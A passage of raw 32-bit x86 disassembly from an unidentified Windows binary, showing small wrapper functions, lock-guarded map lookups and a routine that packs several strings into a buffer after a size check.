   1664f:	cmp    ebx,DWORD PTR [eax]
   16651:	je     0x1662a
   16653:	lea    ecx,[ebp-0x4]
   16656:	call   0x13404
   1665b:	push   DWORD PTR [ebp+0xc]
   1665e:	mov    eax,DWORD PTR [ebp-0x4]
   16661:	add    eax,0xc
   16664:	push   eax
   16665:	call   0x19824
   1666a:	test   al,al
   1666c:	jne    0x1662a
   1666e:	mov    eax,DWORD PTR [ebp+0x8]
   16671:	mov    ecx,DWORD PTR [ebp-0x4]
   16674:	mov    BYTE PTR [eax+0x4],0x0
   16678:	pop    edi
   16679:	pop    esi
   1667a:	mov    DWORD PTR [eax],ecx
   1667c:	pop    ebx
   1667d:	leave  
   1667e:	ret    0x8
   16681:	int3   
   16682:	int3   
   16683:	int3   
   16684:	int3   
   16685:	int3   
   16686:	mov    edi,edi
   16688:	push   ebp
   16689:	mov    ebp,esp
   1668b:	sub    esp,0x10
   1668e:	push   DWORD PTR [ebp+0x8]
   16691:	lea    ecx,[ebp-0x10]
   16694:	call   0x15e28
   16699:	push   DWORD PTR [ebp+0xc]
   1669c:	mov    ecx,DWORD PTR [ebp+0x8]
   1669f:	call   0x15e54
   166a4:	mov    ecx,DWORD PTR [ebp+0xc]
   166a7:	lea    eax,[ebp-0x10]
   166aa:	push   eax
   166ab:	call   0x15e54
   166b0:	lea    ecx,[ebp-0x10]
   166b3:	call   0x16110
   166b8:	leave  
   166b9:	ret    0x8
   166bc:	int3   
   166bd:	int3   
   166be:	int3   
   166bf:	int3   
   166c0:	int3   
   166c1:	int3   
   166c2:	mov    edi,edi
   166c4:	push   ebp
   166c5:	mov    ebp,esp
   166c7:	push   esi
   166c8:	push   edi
   166c9:	xor    edi,edi
   166cb:	push   edi
   166cc:	push   edi
   166cd:	push   edi
   166ce:	mov    esi,ecx
   166d0:	mov    eax,DWORD PTR [esi+0x10]
   166d3:	push   edi
   166d4:	push   eax
   166d5:	call   DWORD PTR ds:0x1f028
   166db:	test   eax,eax
   166dd:	jl     0x166f4
   166df:	lea    eax,[ebp+0x8]
   166e2:	push   eax
   166e3:	mov    ecx,esi
   166e5:	call   0x14c9a
   166ea:	push   edi
   166eb:	push   DWORD PTR [esi+0x10]
   166ee:	call   DWORD PTR ds:0x1f024
   166f4:	pop    edi
   166f5:	pop    esi
   166f6:	pop    ebp
   166f7:	ret    0x4
   166fa:	int3   
   166fb:	int3   
   166fc:	int3   
   166fd:	int3   
   166fe:	int3   
   166ff:	int3   
   16700:	mov    edi,edi
   16702:	push   ebp
   16703:	mov    ebp,esp
   16705:	sub    esp,0x50
   16708:	test   BYTE PTR [ebp+0x8],0x20
   1670c:	je     0x167bb
   16712:	push   ebx
   16713:	lea    ecx,[ebp-0x50]
   16716:	call   0x136ea
   1671b:	mov    ecx,DWORD PTR ds:0x7eef0
   16721:	lea    eax,[ebp-0x50]
   16724:	push   eax
   16725:	push   DWORD PTR [ebp+0xc]
   16728:	call   0x160a8
   1672d:	test   al,al
   1672f:	je     0x167b7
   16735:	mov    ecx,DWORD PTR [ebp+0x10]
   16738:	lea    eax,[ebp-0x48]
   1673b:	push   eax
   1673c:	call   0x129fc
   16741:	mov    eax,DWORD PTR [ebp+0x14]
   16744:	mov    ecx,DWORD PTR [ebp-0x40]
   16747:	mov    DWORD PTR [eax],ecx
   16749:	mov    ecx,DWORD PTR [ebp+0x18]
   1674c:	lea    eax,[ebp-0x3c]
   1674f:	push   eax
   16750:	call   0x129fc
   16755:	mov    ecx,DWORD PTR [ebp+0x1c]
   16758:	lea    eax,[ebp-0x34]
   1675b:	push   eax
   1675c:	call   0x129fc
   16761:	mov    ecx,DWORD PTR [ebp+0x20]
   16764:	lea    eax,[ebp-0x2c]
   16767:	push   eax
   16768:	call   0x129fc
   1676d:	mov    eax,DWORD PTR [ebp+0x28]
   16770:	mov    ecx,DWORD PTR [ebp-0x24]
   16773:	mov    DWORD PTR [eax],ecx
   16775:	mov    ecx,DWORD PTR [ebp+0x24]
   16778:	lea    eax,[ebp-0x8]
   1677b:	push   eax
   1677c:	call   0x129fc
   16781:	mov    eax,DWORD PTR [ebp+0x30]
   16784:	mov    ecx,DWORD PTR [ebp-0x18]
   16787:	mov    DWORD PTR [eax],ecx
   16789:	mov    ecx,DWORD PTR [ebp-0x14]
   1678c:	mov    DWORD PTR [eax+0x4],ecx
   1678f:	mov    eax,DWORD PTR [ebp+0x34]
   16792:	mov    ecx,DWORD PTR [ebp-0x10]
   16795:	mov    DWORD PTR [eax],ecx
   16797:	mov    ecx,DWORD PTR [ebp-0xc]
   1679a:	mov    DWORD PTR [eax+0x4],ecx
   1679d:	mov    eax,DWORD PTR [ebp+0x2c]
   167a0:	mov    ecx,DWORD PTR [ebp-0x20]
   167a3:	mov    DWORD PTR [eax],ecx
   167a5:	mov    bl,0x1
   167a7:	lea    ecx,[ebp-0x50]
   167aa:	call   0x11ef4
   167af:	mov    al,bl
   167b1:	pop    ebx
   167b2:	jmp    0x16852
   167b7:	xor    bl,bl
   167b9:	jmp    0x167a7
   167bb:	mov    ecx,DWORD PTR ds:0x7eee8
   167c1:	push   esi
   167c2:	push   DWORD PTR [ebp+0xc]
   167c5:	lea    eax,[ebp+0xc]
   167c8:	push   eax
   167c9:	call   0x13c4e
   167ce:	mov    esi,DWORD PTR [ebp+0xc]
   167d1:	mov    eax,ds:0x7eee8
   167d6:	cmp    esi,DWORD PTR [eax+0x4]
   167d9:	jne    0x167df
   167db:	xor    al,al
   167dd:	jmp    0x16851
   167df:	mov    ecx,DWORD PTR [ebp+0x10]
   167e2:	lea    eax,[esi+0x20]
   167e5:	push   eax
   167e6:	call   0x129fc
   167eb:	mov    eax,DWORD PTR [esi+0x28]
   167ee:	mov    ecx,DWORD PTR [ebp+0x14]
   167f1:	mov    DWORD PTR [ecx],eax
   167f3:	mov    ecx,DWORD PTR [ebp+0x18]
   167f6:	lea    eax,[esi+0x2c]
   167f9:	push   eax
   167fa:	call   0x129fc
   167ff:	mov    ecx,DWORD PTR [ebp+0x1c]
   16802:	lea    eax,[esi+0x34]
   16805:	push   eax
   16806:	call   0x129fc
   1680b:	mov    ecx,DWORD PTR [ebp+0x20]
   1680e:	lea    eax,[esi+0x3c]
   16811:	push   eax
   16812:	call   0x129fc
   16817:	mov    ecx,DWORD PTR [ebp+0x24]
   1681a:	lea    eax,[esi+0x60]
   1681d:	push   eax
   1681e:	call   0x129fc
   16823:	mov    eax,DWORD PTR [esi+0x44]
   16826:	mov    ecx,DWORD PTR [ebp+0x28]
   16829:	mov    DWORD PTR [ecx],eax
   1682b:	mov    ecx,DWORD PTR [esi+0x50]
   1682e:	mov    eax,DWORD PTR [ebp+0x30]
   16831:	mov    DWORD PTR [eax],ecx
   16833:	mov    ecx,DWORD PTR [esi+0x54]
   16836:	mov    DWORD PTR [eax+0x4],ecx
   16839:	mov    ecx,DWORD PTR [esi+0x58]
   1683c:	mov    eax,DWORD PTR [ebp+0x34]
   1683f:	mov    DWORD PTR [eax],ecx
   16841:	mov    ecx,DWORD PTR [esi+0x5c]
   16844:	mov    DWORD PTR [eax+0x4],ecx
   16847:	mov    eax,DWORD PTR [esi+0x48]
   1684a:	mov    ecx,DWORD PTR [ebp+0x2c]
   1684d:	mov    DWORD PTR [ecx],eax
   1684f:	mov    al,0x1
   16851:	pop    esi
   16852:	leave  
   16853:	ret    0x30
   16856:	int3   
   16857:	int3   
   16858:	int3   
   16859:	int3   
   1685a:	int3   
   1685b:	int3   
   1685c:	push   0x54
   1685e:	push   0x7e188
   16863:	call   0x1daf8
   16868:	xor    esi,esi
   1686a:	push   esi
   1686b:	push   esi
   1686c:	push   esi
   1686d:	push   esi
   1686e:	push   0x7e560
   16873:	call   DWORD PTR ds:0x1f028
   16879:	cmp    eax,esi
   1687b:	jl     0x16a3c
   16881:	mov    DWORD PTR [ebp-0x4],esi
   16884:	or     edi,0xffffffff
   16887:	push   edi
   16888:	mov    esi,0x1df10
   1688d:	push   esi
   1688e:	lea    ecx,[ebp-0x54]
   16891:	call   0x110b8
   16896:	push   edi
   16897:	push   esi
   16898:	lea    ecx,[ebp-0x4c]
   1689b:	call   0x110b8
   168a0:	push   edi
   168a1:	push   esi
   168a2:	lea    ecx,[ebp-0x44]
   168a5:	call   0x110b8
   168aa:	push   edi
   168ab:	push   esi
   168ac:	lea    ecx,[ebp-0x3c]
   168af:	call   0x110b8
   168b4:	push   edi
   168b5:	push   esi
   168b6:	lea    ecx,[ebp-0x34]
   168b9:	call   0x110b8
   168be:	lea    eax,[ebp-0x64]
   168c1:	push   eax
   168c2:	lea    eax,[ebp-0x5c]
   168c5:	push   eax
   168c6:	lea    eax,[ebp-0x20]
   168c9:	push   eax
   168ca:	lea    eax,[ebp-0x1c]
   168cd:	push   eax
   168ce:	lea    eax,[ebp-0x34]
   168d1:	push   eax
   168d2:	lea    eax,[ebp-0x3c]
   168d5:	push   eax
   168d6:	lea    eax,[ebp-0x44]
   168d9:	push   eax
   168da:	lea    eax,[ebp-0x54]
   168dd:	push   eax
   168de:	lea    eax,[ebp-0x24]
   168e1:	push   eax
   168e2:	lea    eax,[ebp-0x4c]
   168e5:	push   eax
   168e6:	mov    edi,DWORD PTR [ebp+0x8]
   168e9:	push   edi
   168ea:	mov    esi,DWORD PTR [ebp+0xc]
   168ed:	push   DWORD PTR [esi+0x4]
   168f0:	call   0x16700
   168f5:	test   al,al
   168f7:	jne    0x16905
   168f9:	mov    DWORD PTR [esi+0x8],0x1
   16900:	jmp    0x169ea
   16905:	mov    edx,DWORD PTR [edi+0x4]
   16908:	mov    eax,DWORD PTR [ebp-0x48]
   1690b:	lea    ecx,[eax+edx*1+0x2]
   1690f:	mov    eax,DWORD PTR [ebp-0x50]
   16912:	lea    edi,[eax+ecx*1+0x5]
   16916:	mov    eax,DWORD PTR [ebp-0x40]
   16919:	lea    eax,[eax+edi*1+0x1]
   1691d:	mov    DWORD PTR [ebp-0x28],eax
   16920:	mov    ebx,DWORD PTR [ebp-0x38]
   16923:	lea    eax,[ebx+eax*1+0x1]
   16927:	mov    DWORD PTR [ebp-0x2c],eax
   1692a:	mov    ebx,DWORD PTR [ebp-0x30]
   1692d:	lea    eax,[ebx+eax*1+0x1]
   16931:	cmp    eax,DWORD PTR [esi]
   16933:	jbe    0x16943
   16935:	mov    DWORD PTR [esi],eax
   16937:	mov    DWORD PTR [esi+0x8],0x2
   1693e:	jmp    0x169ea
   16943:	and    DWORD PTR [esi+0x8],0x0
   16947:	mov    eax,DWORD PTR [ebp-0x1c]
   1694a:	mov    DWORD PTR [esi+0xc],eax
   1694d:	mov    eax,DWORD PTR [ebp-0x5c]
   16950:	mov    DWORD PTR [esi+0x18],eax
   16953:	mov    eax,DWORD PTR [ebp-0x58]
   16956:	mov    DWORD PTR [esi+0x1c],eax
   16959:	mov    eax,DWORD PTR [ebp-0x64]
   1695c:	mov    DWORD PTR [esi+0x20],eax
   1695f:	mov    eax,DWORD PTR [ebp-0x60]
   16962:	mov    DWORD PTR [esi+0x24],eax
   16965:	mov    eax,DWORD PTR [ebp-0x20]
   16968:	mov    DWORD PTR [esi+0x10],eax
   1696b:	mov    eax,DWORD PTR [ebp+0x8]
   1696e:	mov    eax,DWORD PTR [eax]
   16970:	mov    DWORD PTR [ebp-0x1c],eax
   16973:	lea    eax,[esi+0x28]
   16976:	mov    ebx,DWORD PTR [ebp-0x1c]
   16979:	mov    bl,BYTE PTR [ebx]
   1697b:	mov    BYTE PTR [ebp+0xb],bl
   1697e:	mov    BYTE PTR [eax],bl
   16980:	inc    DWORD PTR [ebp-0x1c]
   16983:	inc    eax
   16984:	test   bl,bl
   16986:	jne    0x16976
   16988:	mov    ebx,DWORD PTR [ebp-0x4c]
   1698b:	lea    edx,[edx+esi*1+0x29]
   1698f:	mov    al,BYTE PTR [ebx]
   16991:	mov    BYTE PTR [edx],al
   16993:	inc    ebx
   16994:	inc    edx
   16995:	test   al,al
   16997:	jne    0x1698f
   16999:	mov    eax,DWORD PTR [ebp-0x24]
   1699c:	mov    DWORD PTR [ecx+esi*1+0x28],eax
   169a0:	mov    edx,DWORD PTR [ebp-0x54]
   169a3:	lea    ecx,[ecx+esi*1+0x2c]
   169a7:	mov    al,BYTE PTR [edx]
   169a9:	mov    BYTE PTR [ecx],al
   169ab:	inc    edx
   169ac:	inc    ecx
   169ad:	test   al,al
   169af:	jne    0x169a7
   169b1:	mov    ecx,DWORD PTR [ebp-0x44]
   169b4:	lea    edi,[edi+esi*1+0x28]
   169b8:	mov    al,BYTE PTR [ecx]
   169ba:	mov    BYTE PTR [edi],al
   169bc:	inc    ecx
   169bd:	inc    edi
   169be:	test   al,al
   169c0:	jne    0x169b8
   169c2:	mov    edx,DWORD PTR [ebp-0x3c]
   169c5:	mov    eax,DWORD PTR [ebp-0x28]
   169c8:	lea    eax,[eax+esi*1+0x28]
   169cc:	mov    cl,BYTE PTR [edx]
   169ce:	mov    BYTE PTR [eax],cl
   169d0:	inc    edx
   169d1:	inc    eax
   169d2:	test   cl,cl
   169d4:	jne    0x169cc
   169d6:	mov    ecx,DWORD PTR [ebp-0x34]
   169d9:	mov    eax,DWORD PTR [ebp-0x2c]
   169dc:	lea    esi,[eax+esi*1+0x28]
   169e0:	mov    al,BYTE PTR [ecx]
   169e2:	mov    BYTE PTR [esi],al
   169e4:	inc    ecx
   169e5:	inc    esi
   169e6:	test   al,al
   169e8:	jne    0x169e0
   169ea:	push   DWORD PTR [ebp-0x34]
   169ed:	call   0x10a86
   169f2:	push   DWORD PTR [ebp-0x3c]
   169f5:	call   0x10a86
   169fa:	push   DWORD PTR [ebp-0x44]
   169fd:	call   0x10a86
   16a02:	push   DWORD PTR [ebp-0x4c]
   16a05:	call   0x10a86
   16a0a:	push   DWORD PTR [ebp-0x54]
   16a0d:	call   0x10a86
   16a12:	add    esp,0x14
   16a15:	jmp    0x16a28
   16a17:	xor    eax,eax
   16a19:	inc    eax
   16a1a:	ret    
   16a1b:	mov    esp,DWORD PTR [ebp-0x18]
   16a1e:	mov    eax,DWORD PTR [ebp+0xc]
   16a21:	mov    DWORD PTR [eax+0x8],0x4
   16a28:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16a2f:	push   0x0
   16a31:	push   0x7e560
   16a36:	call   DWORD PTR ds:0x1f024
   16a3c:	call   0x1db3d
   16a41:	ret    0x8
   16a44:	int3   
   16a45:	int3   
   16a46:	int3   
   16a47:	int3   
   16a48:	int3   
   16a49:	int3   
   16a4a:	mov    edi,edi
   16a4c:	push   ebp
   16a4d:	mov    ebp,esp
   16a4f:	sub    esp,0x10
   16a52:	mov    eax,DWORD PTR [ebp+0x8]
   16a55:	mov    eax,DWORD PTR [eax]
   16a57:	and    DWORD PTR [ebp-0x4],0x0
   16a5b:	mov    DWORD PTR [ebp-0x8],eax
   16a5e:	lea    eax,[ebp-0x8]
   16a61:	push   eax
   16a62:	lea    eax,[ebp-0x10]
   16a65:	push   eax
   16a66:	call   0x16162
   16a6b:	mov    eax,DWORD PTR [eax]
   16a6d:	add    eax,0x10
   16a70:	leave  
   16a71:	ret    0x4
   16a74:	int3   
   16a75:	int3   
   16a76:	int3   
   16a77:	int3   
   16a78:	int3   
   16a79:	int3   
   16a7a:	mov    edi,edi
   16a7c:	push   esi
   16a7d:	mov    esi,ecx
   16a7f:	mov    BYTE PTR [esi+0x8],0x0
   16a83:	call   0x1413a
   16a88:	mov    eax,esi
   16a8a:	pop    esi
   16a8b:	ret    0x8
   16a8e:	int3   
   16a8f:	int3   
   16a90:	int3   
   16a91:	int3   
   16a92:	int3   
   16a93:	int3   
   16a94:	mov    edi,edi
   16a96:	push   ebp
   16a97:	mov    ebp,esp
   16a99:	push   ecx
   16a9a:	push   ecx
   16a9b:	push   DWORD PTR [ebp+0xc]
   16a9e:	lea    eax,[ebp-0x8]
   16aa1:	push   eax
   16aa2:	call   0x1620c
   16aa7:	mov    eax,DWORD PTR [ebp+0x8]
   16aaa:	mov    ecx,DWORD PTR [ebp-0x8]
   16aad:	mov    DWORD PTR [eax],ecx
   16aaf:	mov    cl,BYTE PTR [ebp-0x4]
   16ab2:	mov    BYTE PTR [eax+0x4],cl
   16ab5:	leave  
   16ab6:	ret    0x8
   16ab9:	int3   
   16aba:	int3   
   16abb:	int3   
   16abc:	int3   
   16abd:	int3   
   16abe:	mov    edi,edi
   16ac0:	push   ebp
   16ac1:	mov    ebp,esp
   16ac3:	push   ecx
   16ac4:	push   esi
   16ac5:	mov    esi,ecx
   16ac7:	mov    eax,DWORD PTR [esi+0x4]
   16aca:	mov    ecx,DWORD PTR [eax]
   16acc:	push   eax
   16acd:	push   ecx
   16ace:	lea    eax,[ebp-0x4]
   16ad1:	push   eax
   16ad2:	mov    ecx,esi
   16ad4:	call   0x162a6
   16ad9:	push   DWORD PTR [esi+0x4]
   16adc:	call   0x10a86
   16ae1:	xor    eax,eax
   16ae3:	mov    DWORD PTR [esi+0x4],eax
   16ae6:	mov    DWORD PTR [esi+0xc],eax
   16ae9:	dec    DWORD PTR ds:0x7fa2c
   16aef:	pop    ecx
   16af0:	pop    esi
   16af1:	jne    0x16b09
   16af3:	mov    ecx,DWORD PTR ds:0x7f8c0
   16af9:	mov    ds:0x7f8c0,eax
   16afe:	cmp    ecx,eax
   16b00:	je     0x16b09
   16b02:	push   ecx
   16b03:	call   0x10a86
   16b08:	pop    ecx
   16b09:	leave  
   16b0a:	ret    
   16b0b:	int3   
   16b0c:	int3   
   16b0d:	int3   
   16b0e:	int3   
   16b0f:	int3   
   16b10:	mov    edi,edi
   16b12:	push   ebp
   16b13:	mov    ebp,esp
   16b15:	push   ecx
   16b16:	push   ecx
   16b17:	push   DWORD PTR [ebp+0xc]
   16b1a:	lea    eax,[ebp-0x8]
   16b1d:	push   eax
   16b1e:	call   0x16324
   16b23:	mov    eax,DWORD PTR [ebp+0x8]
   16b26:	mov    ecx,DWORD PTR [ebp-0x8]
   16b29:	mov    DWORD PTR [eax],ecx
   16b2b:	mov    cl,BYTE PTR [ebp-0x4]
   16b2e:	mov    BYTE PTR [eax+0x4],cl
   16b31:	leave  
   16b32:	ret    0x8
   16b35:	int3   
   16b36:	int3   
   16b37:	int3   
   16b38:	int3   
   16b39:	int3   
   16b3a:	mov    edi,edi
   16b3c:	push   ebp
   16b3d:	mov    ebp,esp
   16b3f:	push   ecx
   16b40:	mov    eax,DWORD PTR [ecx+0x4]
   16b43:	mov    edx,DWORD PTR [eax]
   16b45:	push   eax
   16b46:	push   edx
   16b47:	lea    eax,[ebp-0x4]
   16b4a:	push   eax
   16b4b:	call   0x163be
   16b50:	leave  
   16b51:	ret    
   16b52:	int3   
   16b53:	int3   
   16b54:	int3   
   16b55:	int3   
   16b56:	int3   
   16b57:	int3   
   16b58:	mov    edi,edi
   16b5a:	push   ebp
   16b5b:	mov    ebp,esp
   16b5d:	push   ecx
   16b5e:	push   ecx
   16b5f:	push   DWORD PTR [ebp+0xc]
   16b62:	lea    eax,[ebp-0x8]
   16b65:	push   eax
   16b66:	call   0x1643c
   16b6b:	mov    eax,DWORD PTR [ebp+0x8]
   16b6e:	mov    ecx,DWORD PTR [ebp-0x8]
   16b71:	mov    DWORD PTR [eax],ecx
   16b73:	mov    cl,BYTE PTR [ebp-0x4]
   16b76:	mov    BYTE PTR [eax+0x4],cl
   16b79:	leave  
   16b7a:	ret    0x8
   16b7d:	int3   
   16b7e:	int3   
   16b7f:	int3   
   16b80:	int3   
   16b81:	int3   
   16b82:	mov    edi,edi
   16b84:	push   ebp
   16b85:	mov    ebp,esp
   16b87:	push   ecx
   16b88:	push   ecx
   16b89:	push   DWORD PTR [ebp+0xc]
   16b8c:	lea    eax,[ebp-0x8]
   16b8f:	push   eax
   16b90:	call   0x164d6
   16b95:	mov    eax,DWORD PTR [ebp+0x8]
   16b98:	mov    ecx,DWORD PTR [ebp-0x8]
   16b9b:	mov    DWORD PTR [eax],ecx
   16b9d:	mov    cl,BYTE PTR [ebp-0x4]
   16ba0:	mov    BYTE PTR [eax+0x4],cl
   16ba3:	leave  
   16ba4:	ret    0x8
   16ba7:	int3   
   16ba8:	int3   
   16ba9:	int3   
   16baa:	int3   
   16bab:	int3   
   16bac:	mov    edi,edi
   16bae:	push   ebp
   16baf:	mov    ebp,esp
   16bb1:	push   ecx
   16bb2:	push   ecx
   16bb3:	push   esi
   16bb4:	push   DWORD PTR [ebp+0x8]
   16bb7:	lea    eax,[ebp-0x8]
   16bba:	push   eax
   16bbb:	mov    esi,ecx
   16bbd:	call   0x1419c
   16bc2:	and    DWORD PTR [ebp+0x8],0x0
   16bc6:	lea    eax,[ebp+0x8]
   16bc9:	push   eax
   16bca:	push   DWORD PTR [ebp-0x4]
   16bcd:	push   DWORD PTR [ebp-0x8]
   16bd0:	call   0x13a92
   16bd5:	add    esp,0xc
   16bd8:	push   DWORD PTR [ebp-0x4]
   16bdb:	lea    eax,[ebp-0x4]
   16bde:	push   DWORD PTR [ebp-0x8]
   16be1:	mov    ecx,esi
   16be3:	push   eax
   16be4:	call   0x1656e
   16be9:	mov    eax,DWORD PTR [ebp+0x8]
   16bec:	pop    esi
   16bed:	leave  
   16bee:	ret    0x4
   16bf1:	int3   
   16bf2:	int3   
   16bf3:	int3   
   16bf4:	int3   
   16bf5:	int3   
   16bf6:	mov    edi,edi
   16bf8:	push   ebp
   16bf9:	mov    ebp,esp
   16bfb:	push   ecx
   16bfc:	mov    eax,DWORD PTR [ecx+0x4]
   16bff:	mov    edx,DWORD PTR [eax]
   16c01:	push   eax
   16c02:	push   edx
   16c03:	lea    eax,[ebp-0x4]
   16c06:	push   eax
   16c07:	call   0x1656e
   16c0c:	leave  
   16c0d:	ret    
   16c0e:	int3   
   16c0f:	int3   
   16c10:	int3   
   16c11:	int3   
   16c12:	int3   
   16c13:	int3   
   16c14:	mov    edi,edi
   16c16:	push   ebp
   16c17:	mov    ebp,esp
   16c19:	push   ecx
   16c1a:	push   ecx
   16c1b:	push   DWORD PTR [ebp+0xc]
   16c1e:	lea    eax,[ebp-0x8]
   16c21:	push   eax
   16c22:	call   0x165ec
   16c27:	mov    eax,DWORD PTR [ebp+0x8]
   16c2a:	mov    ecx,DWORD PTR [ebp-0x8]
   16c2d:	mov    DWORD PTR [eax],ecx
   16c2f:	mov    cl,BYTE PTR [ebp-0x4]
   16c32:	mov    BYTE PTR [eax+0x4],cl
   16c35:	leave  
   16c36:	ret    0x8
   16c39:	int3   
   16c3a:	int3   
   16c3b:	int3   
   16c3c:	int3   
   16c3d:	int3   
   16c3e:	mov    edi,edi
   16c40:	push   esi
   16c41:	mov    esi,ecx
   16c43:	push   edi
   16c44:	mov    BYTE PTR [esi+0x8],0x0
   16c48:	call   0x14012
   16c4d:	lea    edi,[esi+0x10]
   16c50:	mov    ecx,edi
   16c52:	call   0x12a46
   16c57:	mov    edi,DWORD PTR [edi]
   16c59:	push   0x0
   16c5b:	push   edi
   16c5c:	call   0x11c74
   16c61:	call   eax
   16c63:	pop    edi
   16c64:	mov    eax,esi
   16c66:	pop    esi
   16c67:	ret    
   16c68:	int3   
   16c69:	int3   
   16c6a:	int3   
   16c6b:	int3   
   16c6c:	int3   
   16c6d:	int3   
   16c6e:	mov    edi,edi
   16c70:	push   ebp
   16c71:	mov    ebp,esp
   16c73:	push   esi
   16c74:	push   edi
   16c75:	xor    edi,edi
   16c77:	push   edi
   16c78:	push   edi
   16c79:	push   edi
   16c7a:	mov    esi,ecx
   16c7c:	mov    eax,DWORD PTR [esi+0x10]
   16c7f:	push   edi
   16c80:	push   eax
   16c81:	call   DWORD PTR ds:0x1f028
   16c87:	test   eax,eax
   16c89:	jl     0x16ca5
   16c8b:	lea    eax,[ebp+0x8]
   16c8e:	push   eax
   16c8f:	mov    ecx,esi
   16c91:	call   0x16a4a
   16c96:	mov    ecx,DWORD PTR [ebp+0xc]
   16c99:	push   edi
   16c9a:	mov    DWORD PTR [eax],ecx
   16c9c:	push   DWORD PTR [esi+0x10]
   16c9f:	call   DWORD PTR ds:0x1f024
   16ca5:	pop    edi
   16ca6:	pop    esi
   16ca7:	pop    ebp
   16ca8:	ret    0x8
   16cab:	int3   
   16cac:	int3   
   16cad:	int3   
   16cae:	int3   
   16caf:	int3   
   16cb0:	mov    edi,edi
   16cb2:	push   ebp
   16cb3:	mov    ebp,esp
   16cb5:	sub    esp,0x38
   16cb8:	push   esi
   16cb9:	call   0x1a202
   16cbe:	test   al,al
   16cc0:	jne    0x16cca
   16cc2:	mov    eax,DWORD PTR [ebp+0x8]
   16cc5:	jmp    0x16d9b
   16cca:	push   DWORD PTR [ebp+0xc]
   16ccd:	lea    ecx,[ebp-0x8]
   16cd0:	push   DWORD PTR [ebp+0x8]
   16cd3:	call   0x12b2c
   16cd8:	mov    ecx,DWORD PTR ds:0x7fa58
   16cde:	lea    eax,[ebp-0x8]
   16ce1:	push   eax
   16ce2:	lea    eax,[ebp+0xc]
   16ce5:	push   eax
   16ce6:	call   0x14230
   16ceb:	mov    esi,DWORD PTR [ebp+0xc]
   16cee:	mov    eax,ds:0x7fa58
   16cf3:	cmp    esi,DWORD PTR [eax+0x4]
   16cf6:	jne    0x16d56
   16cf8:	push   ecx
   16cf9:	push   ecx
   16cfa:	lea    eax,[ebp-0x8]
   16cfd:	mov    ecx,esp
   16cff:	push   eax
   16d00:	call   0x12b4c
   16d05:	lea    eax,[ebp-0x10]
   16d08:	push   eax
   16d09:	call   0x12bca
   16d0e:	lea    eax,[ebp-0x10]
   16d11:	push   eax
   16d12:	lea    eax,[ebp-0x8]
   16d15:	push   eax
   16d16:	lea    ecx,[ebp-0x38]
   16d19:	call   0x12d1c
   16d1e:	lea    eax,[ebp-0x38]
   16d21:	push   eax
   16d22:	lea    ecx,[ebp-0x28]
   16d25:	call   0x134b4
   16d2a:	mov    ecx,DWORD PTR ds:0x7fa58
   16d30:	lea    eax,[ebp-0x28]
   16d33:	push   eax
   16d34:	lea    eax,[ebp-0x18]
   16d37:	push   eax
   16d38:	call   0x16c14
   16d3d:	lea    ecx,[ebp-0x28]
   16d40:	call   0x1109a
   16d45:	lea    ecx,[ebp-0x38]
   16d48:	call   0x1109a
   16d4d:	push   DWORD PTR [ebp-0x10]
   16d50:	call   0x10a86
   16d55:	pop    ecx
   16d56:	mov    eax,DWORD PTR [ebp+0x10]
   16d59:	movzx  eax,BYTE PTR [eax]
   16d5c:	cmp    eax,0x100
   16d61:	jge    0x16d79
   16d63:	mov    ecx,DWORD PTR ds:0x7fa58
   16d69:	lea    eax,[ebp-0x8]
   16d6c:	push   eax
   16d6d:	lea    eax,[ebp+0xc]
   16d70:	push   eax
   16d71:	call   0x14230
   16d76:	mov    esi,DWORD PTR [ebp+0xc]
   16d79:	mov    eax,ds:0x7fa58
   16d7e:	cmp    esi,DWORD PTR [eax+0x4]
   16d81:	je     0x16d88
   16d83:	mov    esi,DWORD PTR [esi+0x14]
   16d86:	jmp    0x16d8b
   16d88:	mov    esi,DWORD PTR [ebp+0x8]
   16d8b:	call   0x1a21e
   16d90:	push   DWORD PTR [ebp-0x8]
   16d93:	call   0x10a86
   16d98:	pop    ecx
   16d99:	mov    eax,esi
   16d9b:	pop    esi
   16d9c:	leave  
   16d9d:	ret    0xc
   16da0:	int3   
   16da1:	int3   
   16da2:	int3   
   16da3:	int3   
   16da4:	int3   
   16da5:	int3   
   16da6:	mov    edi,edi
   16da8:	push   ebp
   16da9:	mov    ebp,esp
   16dab:	sub    esp,0x38
   16dae:	push   esi
   16daf:	call   0x1a202
   16db4:	test   al,al
   16db6:	jne    0x16dc0
   16db8:	mov    eax,DWORD PTR [ebp+0x8]
   16dbb:	jmp    0x16e91
   16dc0:	push   DWORD PTR [ebp+0xc]
   16dc3:	lea    ecx,[ebp-0x8]
   16dc6:	push   DWORD PTR [ebp+0x8]
   16dc9:	call   0x129ba
   16dce:	mov    ecx,DWORD PTR ds:0x7fa5c
   16dd4:	lea    eax,[ebp-0x8]
   16dd7:	push   eax
   16dd8:	lea    eax,[ebp+0xc]
   16ddb:	push   eax
   16ddc:	call   0x13c96
   16de1:	mov    esi,DWORD PTR [ebp+0xc]
   16de4:	mov    eax,ds:0x7fa5c
   16de9:	cmp    esi,DWORD PTR [eax+0x4]
   16dec:	jne    0x16e4c
   16dee:	push   ecx
   16def:	push   ecx
   16df0:	lea    eax,[ebp-0x8]
   16df3:	mov    ecx,esp
   16df5:	push   eax
   16df6:	call   0x129da
   16dfb:	lea    eax,[ebp-0x10]
   16dfe:	push   eax
   16dff:	call   0x12c0e
   16e04:	lea    eax,[ebp-0x10]
   16e07:	push   eax
   16e08:	lea    eax,[ebp-0x8]
   16e0b:	push   eax
   16e0c:	lea    ecx,[ebp-0x38]
   16e0f:	call   0x1361a
   16e14:	lea    eax,[ebp-0x38]
   16e17:	push   eax
   16e18:	lea    ecx,[ebp-0x28]
   16e1b:	call   0x134e0
   16e20:	mov    ecx,DWORD PTR ds:0x7fa5c
   16e26:	lea    eax,[ebp-0x28]
   16e29:	push   eax
   16e2a:	lea    eax,[ebp-0x18]
   16e2d:	push   eax
   16e2e:	call   0x16b58
   16e33:	lea    ecx,[ebp-0x28]
   16e36:	call   0x1109a
   16e3b:	lea    ecx,[ebp-0x38]
   16e3e:	call   0x1109a
   16e43:	push   DWORD PTR [ebp-0x10]
   16e46:	call   0x10a86
   16e4b:	pop    ecx
   16e4c:	mov    eax,DWORD PTR [ebp+0x10]
   16e4f:	movzx  eax,BYTE PTR [eax]
   16e52:	cmp    eax,0x100
   16e57:	jge    0x16e6f
   16e59:	mov    ecx,DWORD PTR ds:0x7fa5c
   16e5f:	lea    eax,[ebp-0x8]
   16e62:	push   eax
   16e63:	lea    eax,[ebp+0xc]
   16e66:	push   eax
   16e67:	call   0x13c96
